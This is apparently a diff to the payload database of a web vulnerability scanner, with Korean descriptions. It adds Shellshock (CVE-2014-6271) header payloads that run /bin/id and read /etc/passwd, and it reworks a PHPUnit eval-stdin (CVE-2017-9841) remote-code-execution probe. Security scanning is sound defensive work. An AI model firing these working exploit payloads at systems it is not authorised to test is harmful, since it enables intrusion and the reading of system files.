@@ -4900,14 +4900,57 @@
           }
         },
         {
+          "id": "cve_shellshock_6271_ua_id",
+          "name": "CVE-2014-6271 Shellshock (User-Agent · id)",
+          "payload": "() { :;}; echo; echo; /bin/id",
+          "description": "User-Agent 경유 bash 함수 주입 → id 실행. 응답에 uid= 가 나오면 성공.",
+          "risk": "critical",
+          "cve": "CVE-2014-6271",
+          "location": "header",
+          "param": "User-Agent",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
+          "applies_to": {
+            "path_contains": ["/cgi-bin", ".cgi", ".sh", ".pl"]
+          }
+        },
+        {
+          "id": "cve_shellshock_6271_referer",
+          "name": "CVE-2014-6271 Shellshock (Referer 벡터)",
+          "payload": "() { :;}; echo; echo; /bin/cat /etc/passwd",
+          "description": "Referer 헤더 경유 Shellshock. 응답에 root:x:0:0 이면 성공.",
+          "risk": "critical",
+          "cve": "CVE-2014-6271",
+          "location": "header",
+          "param": "Referer",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
+          "applies_to": {
+            "path_contains": ["/cgi-bin", ".cgi", ".sh", ".pl"]
+          }
+        },
+        {
+          "id": "cve_shellshock_6271_cookie",
+          "name": "CVE-2014-6271 Shellshock (Cookie 벡터)",
+          "payload": "() { :;}; echo; echo; /bin/id",
+          "description": "Cookie 헤더 경유 Shellshock. 응답에 uid= 면 성공.",
+          "risk": "critical",
+          "cve": "CVE-2014-6271",
+          "location": "header",
+          "param": "Cookie",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
+          "applies_to": {
+            "path_contains": ["/cgi-bin", ".cgi", ".sh", ".pl"]
+          }
+        },
+        {
           "id": "cve_phpunit_9841",
-          "name": "CVE-2017-9841 PHPUnit eval-stdin RCE",
+          "name": "CVE-2017-9841 PHPUnit eval-stdin.php 원격 코드 실행",
           "payload": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
-          "description": "노출된 PHPUnit eval-stdin.php 로 POST 본문 PHP 실행.",
+          "description": "노출된 eval-stdin.php 가 POST 본문의 PHP 를 실행. 본문 <?php echo md5(1); ?> → 응답에 c4ca4238a0b923820dcc509a6f75849b 가 나오면 RCE 성공.",
           "risk": "critical",
           "cve": "CVE-2017-9841",
           "location": "path",
           "param": "",
+          "method": "POST",
           "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
           "applies_to": {
             "path_contains": [
@@ -4918,7 +4961,8 @@
             "powered_by": [
               "php"
             ]
-          }
+          },
+          "body": "<?php echo md5(1); ?>"
         },
         {
           "id": "cve_spring_gw_22947",
@@ -5149,22 +5193,6 @@
               "iis"
             ]
           }
-        },
-        {
-          "id": "cve_2017_9841_phpunit_evalstdin",
-          "name": "CVE-2017-9841 PHPUnit eval-stdin.php 원격 코드 실행",
-          "payload": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
-          "description": "POST 본문의 PHP 코드가 그대로 실행됨. 본문 <?php echo md5(1); ?> → 응답에 c4ca4238a0b923820dcc509a6f75849b 가 나오면 RCE 성공.",
-          "risk": "critical",
-          "cve": "CVE-2017-9841",
-          "location": "path",
-          "param": "",
-          "method": "POST",
-          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
-          "applies_to": {
-            "always": true
-          },
-          "body": "<?php echo md5(1); ?>"
         },
         {
           "id": "cve_2017_12615_tomcat_put",
